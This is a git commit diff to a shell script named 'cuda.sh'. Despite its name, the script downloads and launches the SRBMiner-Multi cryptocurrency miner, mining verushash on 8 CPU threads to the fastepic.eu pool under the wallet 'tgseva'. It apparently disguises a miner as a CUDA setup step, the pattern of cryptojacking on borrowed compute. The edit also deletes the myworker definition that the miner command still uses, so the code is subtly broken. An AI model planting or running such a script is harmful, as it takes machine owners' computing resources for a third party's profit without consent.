9830ec85c3210f2ad18f719b9011d3b4f85c00ad
techne <108133282+varfeplas@users.noreply.github.com>
2023-06-22 15:19:28 +0530

    Update cuda.sh

--- cuda.sh
+++ cuda.sh
@@ -1,10 +1,8 @@
 #!/bin/sh
-myworker=$(date +'%d%m')
-apt install libc6 -y
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz
-tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz
-SRBMiner-Multi-2-2-9
-chmod 700 SRBMiner-MULTI
-chmod +x SRBMiner-MULTI
+apt install libc6 -y &&
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz &&
+tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz &&
+cd SRBMiner-Multi-2-2-9 &&
+chmod +x SRBMiner-MULTI &&
 ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+ssl://fastepic.eu:3418 --wallet tgseva."'${myworker}_innew'" --password x --cpu-threads 8
 
